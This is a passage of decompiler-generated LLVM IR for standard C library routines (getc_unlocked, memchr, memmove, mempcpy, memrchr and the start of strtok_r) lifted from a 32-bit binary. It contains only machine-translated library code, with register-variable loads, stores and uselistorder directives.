  uselistorder label %dec_label_pc_804e9cb, { 1, 0 }
  uselistorder label %dec_label_pc_804e9b1, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804e97e, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804e969, { 1, 0 }
  uselistorder label %dec_label_pc_804e95e, { 1, 0 }
  uselistorder label %dec_label_pc_804e8e5, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804e8d7, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804e89d, { 1, 0 }
  uselistorder label %dec_label_pc_804e86d.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_804e839, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804e808, { 0, 2, 1 }
  uselistorder label %dec_label_pc_804e7f3, { 1, 0 }
  uselistorder label %dec_label_pc_804e75f, { 1, 0 }
  uselistorder label %dec_label_pc_804e737, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804e735, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804e725, { 1, 0 }
  uselistorder label %dec_label_pc_804e6b9, { 1, 0 }
  uselistorder label %dec_label_pc_804e5e2, { 1, 0 }
}

define i32 @getc_unlocked() local_unnamed_addr {
entry:
  %edx.global-to-local = alloca i32, align 4
  %tmp = call i16* @__decompiler_undefined_function_5()
  %stack_var_-5 = alloca i8, align 1
  %v0_804eb48 = load i32, i32* @ebx, align 4
  %v4_804eb4c = ptrtoint i16* %tmp to i32
  store i32 %v4_804eb4c, i32* @ebx, align 4
  %v1_804eb50 = add i32 %v4_804eb4c, 16
  %v2_804eb50 = inttoptr i32 %v1_804eb50 to i32*
  %v3_804eb50 = load i32, i32* %v2_804eb50, align 4
  %v2_804eb53 = add i32 %v4_804eb4c, 24
  %v3_804eb53 = inttoptr i32 %v2_804eb53 to i32*
  %v4_804eb53 = load i32, i32* %v3_804eb53, align 4
  %v10_804eb53 = icmp ult i32 %v3_804eb50, %v4_804eb53
  br i1 %v10_804eb53, label %dec_label_pc_804ebf5, label %dec_label_pc_804eb5c

dec_label_pc_804eb5c:                             ; preds = %entry
  %v2_804eb5c = load i16, i16* %tmp, align 2
  %v3_804eb5c = zext i16 %v2_804eb5c to i32
  %v1_804eb5f = and i32 %v3_804eb5c, 131
  %v6_804eb69 = icmp ugt i32 %v1_804eb5f, 128
  br i1 %v6_804eb69, label %dec_label_pc_804eb83, label %dec_label_pc_804eb6b

dec_label_pc_804eb6b:                             ; preds = %dec_label_pc_804eb5c
  %v0_804eb6b = load i32, i32* @edx, align 4
  %v6_804eb73 = call i32 @__stdio_trans2r_o(i16* nonnull %tmp, i32 128, i32 %v0_804eb6b, i32 %v0_804eb6b)
  %v1_804eb7b = icmp eq i32 %v6_804eb73, 0
  %v1_804eb7d = icmp eq i1 %v1_804eb7b, false
  br i1 %v1_804eb7d, label %dec_label_pc_804ec1a, label %dec_label_pc_804eb6b.dec_label_pc_804eb83_crit_edge

dec_label_pc_804eb6b.dec_label_pc_804eb83_crit_edge: ; preds = %dec_label_pc_804eb6b
  %v0_804eb83.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_804eb83

dec_label_pc_804eb83:                             ; preds = %dec_label_pc_804eb6b.dec_label_pc_804eb83_crit_edge, %dec_label_pc_804eb5c
  %v2_804ebb7 = phi i32 [ %v0_804eb83.pre, %dec_label_pc_804eb6b.dec_label_pc_804eb83_crit_edge ], [ %v4_804eb4c, %dec_label_pc_804eb5c ]
  %v1_804eb83 = inttoptr i32 %v2_804ebb7 to i16*
  %v2_804eb83 = load i16, i16* %v1_804eb83, align 2
  %v3_804eb83 = zext i16 %v2_804eb83 to i32
  store i32 %v3_804eb83, i32* @ecx, align 4
  %v2_804eb86 = and i16 %v2_804eb83, 2
  %v3_804eb86 = icmp eq i16 %v2_804eb86, 0
  br i1 %v3_804eb86, label %dec_label_pc_804eba6, label %dec_label_pc_804eb8b

dec_label_pc_804eb8b:                             ; preds = %dec_label_pc_804eb83
  %tmp20 = urem i16 %v2_804eb83, 2
  %v1_804eb8d = zext i16 %tmp20 to i32
  %tmp19 = sub nsw i32 0, %v1_804eb8d
  %v2_804eb90 = and i32 %tmp19, 4
  %v3_804eb90 = add i32 %v2_804ebb7, 36
  %v4_804eb90 = add i32 %v3_804eb90, %v2_804eb90
  %v5_804eb90 = inttoptr i32 %v4_804eb90 to i8*
  %v6_804eb90 = load i8, i8* %v5_804eb90, align 1
  %v7_804eb90 = zext i8 %v6_804eb90 to i32
  %v8_804eb90 = load i32, i32* @edx, align 4
  %v9_804eb90 = and i32 %v8_804eb90, -256
  %v10_804eb90 = or i32 %v9_804eb90, %v7_804eb90
  store i32 %v10_804eb90, i32* %edx.global-to-local, align 4
  %v1_804eb94 = add i16 %v2_804eb83, -1
  store i16 %v1_804eb94, i16* %v1_804eb83, align 2
  %v0_804eb9a = load i32, i32* @ebx, align 4
  %v1_804eb9a = add i32 %v0_804eb9a, 40
  %v2_804eb9a = inttoptr i32 %v1_804eb9a to i32*
  store i32 0, i32* %v2_804eb9a, align 4
  %v0_804eba1 = load i32, i32* %edx.global-to-local, align 4
  %v1_804eba1 = urem i32 %v0_804eba1, 256
  store i32 %v1_804eba1, i32* @edx, align 4
  br label %dec_label_pc_804ec1d

dec_label_pc_804eba6:                             ; preds = %dec_label_pc_804eb83
  %v1_804eba6 = add i32 %v2_804ebb7, 16
  %v2_804eba6 = inttoptr i32 %v1_804eba6 to i32*
  %v3_804eba6 = load i32, i32* %v2_804eba6, align 4
  store i32 %v3_804eba6, i32* @eax, align 4
  %v1_804eba9 = add i32 %v2_804ebb7, 20
  %v2_804eba9 = inttoptr i32 %v1_804eba9 to i32*
  %v3_804eba9 = load i32, i32* %v2_804eba9, align 4
  %v15_804eba9 = icmp eq i32 %v3_804eba9, %v3_804eba6
  %v1_804ebac = icmp eq i1 %v15_804eba9, false
  br i1 %v1_804ebac, label %dec_label_pc_804ebf5, label %dec_label_pc_804ebae

dec_label_pc_804ebae:                             ; preds = %dec_label_pc_804eba6
  %v1_804ebae = add i32 %v2_804ebb7, 4
  %v2_804ebae = inttoptr i32 %v1_804ebae to i32*
  %v3_804ebae = load i32, i32* %v2_804ebae, align 4
  %v13_804ebae = icmp eq i32 %v3_804ebae, -2
  %v1_804ebb2 = icmp eq i1 %v13_804ebae, false
  br i1 %v1_804ebb2, label %dec_label_pc_804ebbc, label %dec_label_pc_804ebb4

dec_label_pc_804ebb4:                             ; preds = %dec_label_pc_804ebae
  %v1_804ebb4 = or i32 %v3_804eb83, 4
  store i32 %v1_804ebb4, i32* @ecx, align 4
  %v1_804ebb7 = trunc i32 %v1_804ebb4 to i16
  store i16 %v1_804ebb7, i16* %v1_804eb83, align 2
  br label %dec_label_pc_804ec1a

dec_label_pc_804ebbc:                             ; preds = %dec_label_pc_804ebae
  %v3_804ebbc = and i16 %v2_804eb83, 768
  %v4_804ebbc = icmp eq i16 %v3_804ebbc, 0
  br i1 %v4_804ebbc, label %dec_label_pc_804ebd1, label %dec_label_pc_804ebc1

dec_label_pc_804ebc1:                             ; preds = %dec_label_pc_804ebbc
  %v3_804ebc9 = call i32 @fflush_unlocked(i16* bitcast (i32** @global_var_80534d4.318 to i16*))
  %v0_804ebd1.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_804ebd1

dec_label_pc_804ebd1:                             ; preds = %dec_label_pc_804ebbc, %dec_label_pc_804ebc1
  %v0_804ec06 = phi i32 [ %v2_804ebb7, %dec_label_pc_804ebbc ], [ %v0_804ebd1.pre, %dec_label_pc_804ebc1 ]
  %v1_804ebd1 = add i32 %v0_804ec06, 8
  %v2_804ebd1 = inttoptr i32 %v1_804ebd1 to i32*
  %v3_804ebd1 = load i32, i32* %v2_804ebd1, align 4
  %v1_804ebd4 = add i32 %v0_804ec06, 12
  %v2_804ebd4 = inttoptr i32 %v1_804ebd4 to i32*
  %v3_804ebd4 = load i32, i32* %v2_804ebd4, align 4
  %v15_804ebd4 = icmp eq i32 %v3_804ebd4, %v3_804ebd1
  br i1 %v15_804ebd4, label %dec_label_pc_804ebfe, label %dec_label_pc_804ebd9

dec_label_pc_804ebd9:                             ; preds = %dec_label_pc_804ebd1
  %v2_804ebdc = add i32 %v0_804ec06, 24
  %v3_804ebdc = inttoptr i32 %v2_804ebdc to i32*
  store i32 %v3_804ebd1, i32* %v3_804ebdc, align 4
  %v0_804ebdf = load i32, i32* @ebx, align 4
  %v2_804ebe0 = call i32 @__stdio_rfill(i32 %v0_804ebdf)
  %v1_804ebe8 = icmp eq i32 %v2_804ebe0, 0
  br i1 %v1_804ebe8, label %dec_label_pc_804ec1a, label %dec_label_pc_804ebec

dec_label_pc_804ebec:                             ; preds = %dec_label_pc_804ebd9
  %v0_804ebec = load i32, i32* @ebx, align 4
  %v1_804ebec = add i32 %v0_804ebec, 20
  %v2_804ebec = inttoptr i32 %v1_804ebec to i32*
  %v3_804ebec = load i32, i32* %v2_804ebec, align 4
  %v2_804ebef = add i32 %v0_804ebec, 24
  %v3_804ebef = inttoptr i32 %v2_804ebef to i32*
  store i32 %v3_804ebec, i32* %v3_804ebef, align 4
  %v0_804ebf2 = load i32, i32* @ebx, align 4
  %v1_804ebf2 = add i32 %v0_804ebf2, 16
  %v2_804ebf2 = inttoptr i32 %v1_804ebf2 to i32*
  %v3_804ebf2 = load i32, i32* %v2_804ebf2, align 4
  br label %dec_label_pc_804ebf5

dec_label_pc_804ebf5:                             ; preds = %dec_label_pc_804eba6, %entry, %dec_label_pc_804ebec
  %v1_804ebf9 = phi i32 [ %v2_804ebb7, %dec_label_pc_804eba6 ], [ %v4_804eb4c, %entry ], [ %v0_804ebf2, %dec_label_pc_804ebec ]
  %v0_804ebf5 = phi i32 [ %v3_804eba6, %dec_label_pc_804eba6 ], [ %v3_804eb50, %entry ], [ %v3_804ebf2, %dec_label_pc_804ebec ]
  %v1_804ebf5 = inttoptr i32 %v0_804ebf5 to i8*
  %v2_804ebf5 = load i8, i8* %v1_804ebf5, align 1
  %v3_804ebf5 = zext i8 %v2_804ebf5 to i32
  store i32 %v3_804ebf5, i32* @edx, align 4
  %v1_804ebf8 = add i32 %v0_804ebf5, 1
  %v2_804ebf9 = add i32 %v1_804ebf9, 16
  %v3_804ebf9 = inttoptr i32 %v2_804ebf9 to i32*
  store i32 %v1_804ebf8, i32* %v3_804ebf9, align 4
  %v0_804ec20.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_804ec1d

dec_label_pc_804ebfe:                             ; preds = %dec_label_pc_804ebd1
  %v2_804ec01 = ptrtoint i8* %stack_var_-5 to i32
  %v5_804ec06 = inttoptr i32 %v0_804ec06 to i16*
  %v5_804ec07 = call i32 @__stdio_READ(i16* %v5_804ec06, i32 %v2_804ec01, i32 1)
  %v1_804ec0f = icmp eq i32 %v5_804ec07, 0
  br i1 %v1_804ec0f, label %dec_label_pc_804ec1a, label %dec_label_pc_804ec13

dec_label_pc_804ec13:                             ; preds = %dec_label_pc_804ebfe
  %v3_804ec13 = load i8, i8* %stack_var_-5, align 1
  %v4_804ec13 = sext i8 %v3_804ec13 to i32
  store i32 %v4_804ec13, i32* @edx, align 4
  br label %dec_label_pc_804ec1d

dec_label_pc_804ec1a:                             ; preds = %dec_label_pc_804ebfe, %dec_label_pc_804ebd9, %dec_label_pc_804eb6b, %dec_label_pc_804ebb4
  store i32 -1, i32* @edx, align 4
  br label %dec_label_pc_804ec1d

dec_label_pc_804ec1d:                             ; preds = %dec_label_pc_804ec13, %dec_label_pc_804ebf5, %dec_label_pc_804eb8b, %dec_label_pc_804ec1a
  %v0_804ec20 = phi i32 [ %v4_804ec13, %dec_label_pc_804ec13 ], [ %v0_804ec20.pre, %dec_label_pc_804ebf5 ], [ %v1_804eba1, %dec_label_pc_804eb8b ], [ -1, %dec_label_pc_804ec1a ]
  store i32 %v0_804eb48, i32* @ebx, align 4
  ret i32 %v0_804ec20

; uselistorder directives
  uselistorder i32 %v0_804ebf5, { 1, 0 }
  uselistorder i32 %v3_804ebd1, { 1, 0 }
  uselistorder i32 %v0_804ec06, { 0, 1, 3, 2 }
  uselistorder i32 %v3_804eba6, { 1, 0, 2 }
  uselistorder i32 %v1_804eba1, { 1, 0 }
  uselistorder i16 %v2_804eb83, { 2, 0, 1, 3, 4 }
  uselistorder i32 %v2_804ebb7, { 1, 2, 3, 5, 4, 0, 6 }
  uselistorder i8* %stack_var_-5, { 1, 0 }
  uselistorder i32 (i16*)* @fflush_unlocked, { 1, 0 }
  uselistorder i16* @global_var_8053520.309, { 2, 1, 0 }
  uselistorder i32 131, { 1, 0 }
  uselistorder label %dec_label_pc_804ec1d, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_804ec1a, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_804ebf5, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804ebd1, { 1, 0 }
}

define i32 @__GI_memchr(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %zf.global-to-local = alloca i1, align 1
  %stack_var_-4 = alloca i32, align 4
  %v0_804ec24 = load i32, i32* @edi, align 4
  store i32 %v0_804ec24, i32* %stack_var_-4, align 4
  store i32 %arg3, i32* @ecx, align 4
  %v4_804ec2b = ptrtoint i8* %arg1 to i32
  store i32 %v4_804ec2b, i32* %edi.global-to-local, align 4
  %v1_804ec33 = icmp eq i32 %arg3, 0
  store i1 %v1_804ec33, i1* %zf.global-to-local, align 1
  br i1 %v1_804ec33, label %dec_label_pc_804ec43, label %dec_label_pc_804ec37

dec_label_pc_804ec37:                             ; preds = %entry
  %v2_804ec37 = call i32 @_strlen(i8* %arg1)
  %v3_804ec37 = mul i32 %v2_804ec37, -1
  %v4_804ec37 = add i32 %v3_804ec37, -2
  store i32 %v4_804ec37, i32* @ecx, align 4
  %v0_804ec39 = load i1, i1* %zf.global-to-local, align 1
  br i1 %v0_804ec39, label %dec_label_pc_804ec37.dec_label_pc_804ec40_crit_edge, label %dec_label_pc_804ec3b

dec_label_pc_804ec37.dec_label_pc_804ec40_crit_edge: ; preds = %dec_label_pc_804ec37
  %v0_804ec40.pre = load i32, i32* %edi.global-to-local, align 4
  %phitmp = add i32 %v0_804ec40.pre, -1
  br label %dec_label_pc_804ec40

dec_label_pc_804ec3b:                             ; preds = %dec_label_pc_804ec37
  store i32 1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_804ec40

dec_label_pc_804ec40:                             ; preds = %dec_label_pc_804ec37.dec_label_pc_804ec40_crit_edge, %dec_label_pc_804ec3b
  %v0_804ec40 = phi i32 [ %phitmp, %dec_label_pc_804ec37.dec_label_pc_804ec40_crit_edge ], [ 0, %dec_label_pc_804ec3b ]
  %v8_804ec40 = icmp eq i32 %v0_804ec40, 0
  store i1 %v8_804ec40, i1* %zf.global-to-local, align 1
  store i32 %v0_804ec40, i32* %edi.global-to-local, align 4
  %v2_804ec43.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_804ec43

dec_label_pc_804ec43:                             ; preds = %entry, %dec_label_pc_804ec40
  %v0_804ec44 = phi i32 [ 0, %entry ], [ %v0_804ec40, %dec_label_pc_804ec40 ]
  %v2_804ec43 = phi i32 [ %v0_804ec24, %entry ], [ %v2_804ec43.pre, %dec_label_pc_804ec40 ]
  store i32 %v2_804ec43, i32* @edi, align 4
  ret i32 %v0_804ec44

; uselistorder directives
  uselistorder i32 %v0_804ec40, { 2, 0, 1 }
  uselistorder i32 %arg3, { 1, 0 }
  uselistorder label %dec_label_pc_804ec43, { 1, 0 }
  uselistorder label %dec_label_pc_804ec40, { 1, 0 }
}

define i32 @memmove(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp3 = inttoptr i32 %arg2 to i8*
  %stack_var_-8 = alloca i32, align 4
  %v0_804ec49 = load i32, i32* @esi, align 4
  store i32 %v0_804ec49, i32* %stack_var_-8, align 4
  %v4_804ec4a = ptrtoint i8* %arg1 to i32
  %v9_804ec56 = icmp ugt i8* %tmp3, %arg1
  %v1_804ec58 = icmp eq i1 %v9_804ec56, false
  br i1 %v1_804ec58, label %dec_label_pc_804ec60, label %dec_label_pc_804ec5a

dec_label_pc_804ec5a:                             ; preds = %entry
  %v7_804ec5c = call i8* @_memcpy(i8* %arg1, i8* %tmp3, i32 %tmp)
  br label %dec_label_pc_804ec6c

dec_label_pc_804ec60:                             ; preds = %entry
  %v3_804ec60 = add i32 %arg2, -1
  %v4_804ec60 = add i32 %v3_804ec60, %tmp
  %v5_804ec60 = inttoptr i32 %v4_804ec60 to i8*
  %v3_804ec64 = add i32 %v4_804ec4a, -1
  %v4_804ec64 = add i32 %v3_804ec64, %tmp
  %v5_804ec64 = inttoptr i32 %v4_804ec64 to i8*
  %v7_804ec69 = call i8* @_memcpy(i8* %v5_804ec64, i8* %v5_804ec60, i32 %tmp)
  store i1 false, i1* @df, align 1
  br label %dec_label_pc_804ec6c

dec_label_pc_804ec6c:                             ; preds = %dec_label_pc_804ec5a, %dec_label_pc_804ec60
  %v2_804ec6c = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_804ec6c, i32* @esi, align 4
  ret i32 %v4_804ec4a

; uselistorder directives
  uselistorder i8* %tmp3, { 1, 0 }
  uselistorder i32 %tmp, { 0, 1, 3, 2 }
  uselistorder i8* %arg1, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804ec6c, { 1, 0 }
}

define i32 @__GI_mempcpy(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v0_804ec70 = load i32, i32* @esi, align 4
  store i32 %arg1, i32* @esi, align 4
  %v3_804ec83 = inttoptr i32 %arg1 to i16*
  %v4_804ec83 = call i32 @memcpy(i16* %v3_804ec83, i32 %arg2, i32 %arg3)
  %v0_804ec8b = load i32, i32* @esi, align 4
  %v2_804ec8b = add i32 %v0_804ec8b, %arg3
  store i32 %v0_804ec70, i32* @esi, align 4
  ret i32 %v2_804ec8b
}

define i32 @memrchr(i8 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %tmp = trunc i32 %arg2 to i8
  %v4_804ec99 = urem i32 %arg2, 256
  %v4_804eca5 = sext i8 %arg1 to i32
  %v2_804eca9 = add i32 %v4_804eca5, %arg3
  %v1_804ecbb7 = icmp eq i32 %arg3, 0
  br i1 %v1_804ecbb7, label %dec_label_pc_804ecc3, label %dec_label_pc_804ecbf

dec_label_pc_804ecad:                             ; preds = %dec_label_pc_804ecbf
  %v1_804ecad = add i32 %v0_804ecad, -1
  %v5_804ecae = load i32, i32* @edx, align 4
  %v6_804ecae = and i32 %v5_804ecae, -256
  %v7_804ecae = or i32 %v6_804ecae, %v4_804ec99
  store i32 %v7_804ecae, i32* @edx, align 4
  %v1_804ecb2 = inttoptr i32 %v1_804ecad to i8*
  %v2_804ecb2 = load i8, i8* %v1_804ecb2, align 1
  %v15_804ecb2 = icmp eq i8 %v2_804ecb2, %tmp
  br i1 %v15_804ecb2, label %dec_label_pc_804ed40, label %dec_label_pc_804ecba

dec_label_pc_804ecba:                             ; preds = %dec_label_pc_804ecad
  %v1_804ecba = add i32 %v0_804ecba, -1
  %v8_804ecba = icmp eq i32 %v1_804ecba, 0
  br i1 %v8_804ecba, label %dec_label_pc_804ecc3, label %dec_label_pc_804ecbf

dec_label_pc_804ecbf:                             ; preds = %entry, %dec_label_pc_804ecba
  %v0_804ecba = phi i32 [ %v1_804ecba, %dec_label_pc_804ecba ], [ %arg3, %entry ]
  %v0_804ecad = phi i32 [ %v1_804ecad, %dec_label_pc_804ecba ], [ %v2_804eca9, %entry ]
  %v2_804ecbf = urem i32 %v0_804ecad, 4
  %v3_804ecbf = icmp eq i32 %v2_804ecbf, 0
  %v1_804ecc1 = icmp eq i1 %v3_804ecbf, false
  br i1 %v1_804ecc1, label %dec_label_pc_804ecad, label %dec_label_pc_804ecc3

dec_label_pc_804ecc3:                             ; preds = %dec_label_pc_804ecba, %dec_label_pc_804ecbf, %entry
  %v0_804ed26.pr = phi i32 [ 0, %entry ], [ 0, %dec_label_pc_804ecba ], [ %v0_804ecba, %dec_label_pc_804ecbf ]
  %v0_804ecc8 = phi i32 [ %v2_804eca9, %entry ], [ %v1_804ecad, %dec_label_pc_804ecba ], [ %v0_804ecad, %dec_label_pc_804ecbf ]
  store i32 %v0_804ecc8, i32* @ecx, align 4
  %v2_804eccc = mul nuw nsw i32 %v4_804ec99, 256
  %v2_804eccf = or i32 %v2_804eccc, %v4_804ec99
  %v2_804ecd3 = mul i32 %v2_804eccf, 65536
  %v2_804ecd6 = or i32 %v2_804ecd3, %v2_804eccf
  %v6_804ed2955 = icmp ugt i32 %v0_804ed26.pr, 3
  br i1 %v6_804ed2955, label %dec_label_pc_804ecda, label %dec_label_pc_804ed2b

dec_label_pc_804ecda:                             ; preds = %dec_label_pc_804ecc3, %dec_label_pc_804ed23
  %v0_804ed2357 = phi i32 [ %v1_804ed23, %dec_label_pc_804ed23 ], [ %v0_804ed26.pr, %dec_label_pc_804ecc3 ]
  %v0_804ecda56 = phi i32 [ %v1_804ecda, %dec_label_pc_804ed23 ], [ %v0_804ecc8, %dec_label_pc_804ecc3 ]
  %v1_804ecda = add i32 %v0_804ecda56, -4
  store i32 %v1_804ecda, i32* @ecx, align 4
  %v2_804ecdf = inttoptr i32 %v1_804ecda to i32*
  %v3_804ecdf = load i32, i32* %v2_804ecdf, align 4
  %v4_804ecdf = xor i32 %v3_804ecdf, %v2_804ecd6
  %v1_804ece1 = add i32 %v4_804ecdf, 2130640639
  %v1_804ece7 = sub i32 -1, %v4_804ecdf
  %v2_804ece9 = xor i32 %v1_804ece1, %v1_804ece7
  %v1_804eceb = and i32 %v2_804ece9, -2130640640
  %v2_804eceb = icmp eq i32 %v1_804eceb, 0
  br i1 %v2_804eceb, label %dec_label_pc_804ed23, label %dec_label_pc_804ecf3

dec_label_pc_804ecf3:                             ; preds = %dec_label_pc_804ecda
  %v7_804ecf3 = or i32 %v1_804eceb, %v4_804ec99
  %v1_804ecf7 = add i32 %v0_804ecda56, -1
  %v2_804ecfa = inttoptr i32 %v1_804ecf7 to i8*
  %v3_804ecfa = load i8, i8* %v2_804ecfa, align 1
  %v16_804ecfa = icmp eq i8 %v3_804ecfa, %tmp
  br i1 %v16_804ecfa, label %dec_label_pc_804ed40, label %dec_label_pc_804ecff

dec_label_pc_804ecff:                             ; preds = %dec_label_pc_804ecf3
  %v1_804ed03 = add i32 %v0_804ecda56, -2
  %v2_804ed06 = inttoptr i32 %v1_804ed03 to i8*
  %v3_804ed06 = load i8, i8* %v2_804ed06, align 1
  %v16_804ed06 = icmp eq i8 %v3_804ed06, %tmp
  br i1 %v16_804ed06, label %dec_label_pc_804ed40, label %dec_label_pc_804ed0b

dec_label_pc_804ed0b:                             ; preds = %dec_label_pc_804ecff
  %v1_804ed0f = add i32 %v0_804ecda56, -3
  %v2_804ed12 = inttoptr i32 %v1_804ed0f to i8*
  %v3_804ed12 = load i8, i8* %v2_804ed12, align 1
  %v16_804ed12 = icmp eq i8 %v3_804ed12, %tmp
  br i1 %v16_804ed12, label %dec_label_pc_804ed40, label %dec_label_pc_804ed17

dec_label_pc_804ed17:                             ; preds = %dec_label_pc_804ed0b
  %v1_804ed1b = inttoptr i32 %v1_804ecda to i8*
  %v2_804ed1b = load i8, i8* %v1_804ed1b, align 1
  %v15_804ed1b = icmp eq i8 %v2_804ed1b, %tmp
  %v1_804ed1d = icmp eq i1 %v15_804ed1b, false
  br i1 %v1_804ed1d, label %dec_label_pc_804ed23, label %dec_label_pc_804ed1f

dec_label_pc_804ed1f:                             ; preds = %dec_label_pc_804ed17
  br label %dec_label_pc_804ed40

dec_label_pc_804ed23:                             ; preds = %dec_label_pc_804ed17, %dec_label_pc_804ecda
  %v5_804ed3027 = phi i32 [ %v7_804ecf3, %dec_label_pc_804ed17 ], [ 0, %dec_label_pc_804ecda ]
  %v1_804ed23 = add i32 %v0_804ed2357, -4
  %v6_804ed29 = icmp ugt i32 %v1_804ed23, 3
  br i1 %v6_804ed29, label %dec_label_pc_804ecda, label %dec_label_pc_804ed2b

dec_label_pc_804ed2b:                             ; preds = %dec_label_pc_804ed23, %dec_label_pc_804ecc3
  %v5_804ed3026.lcssa = phi i32 [ %v4_804ec99, %dec_label_pc_804ecc3 ], [ %v5_804ed3027, %dec_label_pc_804ed23 ]
  %v0_804ecda.lcssa = phi i32 [ %v0_804ecc8, %dec_label_pc_804ecc3 ], [ %v1_804ecda, %dec_label_pc_804ed23 ]
  %v0_804ed23.lcssa = phi i32 [ %v0_804ed26.pr, %dec_label_pc_804ecc3 ], [ %v1_804ed23, %dec_label_pc_804ed23 ]
  br label %dec_label_pc_804ed38

dec_label_pc_804ed2f:                             ; preds = %dec_label_pc_804ed38
  %v1_804ed38 = add i32 %v0_804ed38, -1
  %v1_804ed2f = add i32 %v0_804ed2f, -1
  %v6_804ed30 = and i32 %v5_804ed30, -256
  %v7_804ed30 = or i32 %v6_804ed30, %v4_804ec99
  %v1_804ed34 = inttoptr i32 %v1_804ed2f to i8*
  %v2_804ed34 = load i8, i8* %v1_804ed34, align 1
  %v15_804ed34 = icmp eq i8 %v2_804ed34, %tmp
  br i1 %v15_804ed34, label %dec_label_pc_804ed40, label %dec_label_pc_804ed38

dec_label_pc_804ed38:                             ; preds = %dec_label_pc_804ed2f, %dec_label_pc_804ed2b
  %v5_804ed30 = phi i32 [ %v7_804ed30, %dec_label_pc_804ed2f ], [ %v5_804ed3026.lcssa, %dec_label_pc_804ed2b ]
  %v0_804ed2f = phi i32 [ %v1_804ed2f, %dec_label_pc_804ed2f ], [ %v0_804ecda.lcssa, %dec_label_pc_804ed2b ]
  %v0_804ed38 = phi i32 [ %v1_804ed38, %dec_label_pc_804ed2f ], [ %v0_804ed23.lcssa, %dec_label_pc_804ed2b ]
  %v10_804ed39 = icmp eq i32 %v0_804ed38, 0
  %v1_804ed3c = icmp eq i1 %v10_804ed39, false
  br i1 %v1_804ed3c, label %dec_label_pc_804ed2f, label %dec_label_pc_804ed3e

dec_label_pc_804ed3e:                             ; preds = %dec_label_pc_804ed38
  br label %dec_label_pc_804ed40

dec_label_pc_804ed40:                             ; preds = %dec_label_pc_804ecad, %dec_label_pc_804ed0b, %dec_label_pc_804ecff, %dec_label_pc_804ecf3, %dec_label_pc_804ed2f, %dec_label_pc_804ed1f, %dec_label_pc_804ed3e
  %v0_804ed43 = phi i32 [ %v1_804ecda, %dec_label_pc_804ed1f ], [ 0, %dec_label_pc_804ed3e ], [ %v1_804ed2f, %dec_label_pc_804ed2f ], [ %v1_804ed0f, %dec_label_pc_804ed0b ], [ %v1_804ed03, %dec_label_pc_804ecff ], [ %v1_804ecf7, %dec_label_pc_804ecf3 ], [ %v1_804ecad, %dec_label_pc_804ecad ]
  ret i32 %v0_804ed43

; uselistorder directives
  uselistorder i32 %v0_804ed38, { 1, 0 }
  uselistorder i32 %v1_804ed23, { 0, 2, 1 }
  uselistorder i32 %v1_804ecda, { 2, 0, 3, 4, 5, 1 }
  uselistorder i32 %v0_804ecda56, { 3, 2, 1, 0 }
  uselistorder i32 %v2_804eccf, { 1, 0 }
  uselistorder i32 %v0_804ecad, { 1, 0, 2 }
  uselistorder i32 %v2_804eca9, { 1, 0 }
  uselistorder i32 %v4_804ec99, { 4, 5, 3, 2, 0, 1 }
  uselistorder i8 %tmp, { 5, 1, 2, 3, 4, 0 }
  uselistorder i32 %arg3, { 0, 2, 1 }
  uselistorder label %dec_label_pc_804ed40, { 6, 4, 5, 1, 2, 3, 0 }
  uselistorder label %dec_label_pc_804ecda, { 1, 0 }
  uselistorder label %dec_label_pc_804ecc3, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804ecbf, { 1, 0 }
}

define i32 @strtok_r(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v0_804ed44 = load i32, i32* @edi, align 4
  %v0_804ed45 = load i32, i32* @esi, align 4
  %v0_804ed46 = load i32, i32* @ebx, align 4
  store i32 %v0_804ed46, i32* %stack_var_-12, align 4
  %v4_804ed47 = ptrtoint i8* %arg1 to i32
  store i32 %v4_804ed47, i32* @ebx, align 4
  store i32 %arg2, i32* @edi, align 4
  store i32 %arg3, i32* @esi, align 4
  %v1_804ed53 = icmp eq i8* %arg1, null
  %v1_804ed55 = icmp eq i1 %v1_804ed53, false
  br i1 %v1_804ed55, label %dec_label_pc_804ed59, label %dec_label_pc_804ed57

dec_label_pc_804ed57:                             ; preds = %entry
  %v1_804ed57 = inttoptr i32 %arg3 to i32*
  %v2_804ed57 = load i32, i32* %v1_804ed57, align 4
  store i32 %v2_804ed57, i32* @ebx, align 4
  br label %dec_label_pc_804ed59

dec_label_pc_804ed59:                             ; preds = %entry, %dec_label_pc_804ed57
  %v0_804ed5c = phi i32 [ %v4_804ed47, %entry ], [ %v2_804ed57, %dec_label_pc_804ed57 ]
  %v0_804ed59 = load i32, i32* @ecx, align 4
  %v5_804ed5c = inttoptr i32 %v0_804ed5c to i8*
  %v8_804ed5d = call i32 @__GI_strspn(i8* %v5_804ed5c, i32 %arg2, i32 %v0_804ed59, i32 %v0_804ed59)
  store i32 %v8_804ed5d, i32* %eax.global-to-local, align 4
  %v0_804ed65 = load i32, i32* @ebx, align 4
  %v2_804ed65 = add i32 %v0_804ed65, %v8_804ed5d
  store i32 %v2_804ed65, i32* @ebx, align 4
  %v1_804ed67 = inttoptr i32 %v2_804ed65 to i8*
  %v2_804ed67 = load i8, i8* %v1_804ed67, align 1
  %v3_804ed67 = icmp eq i8 %v2_804ed67, 0
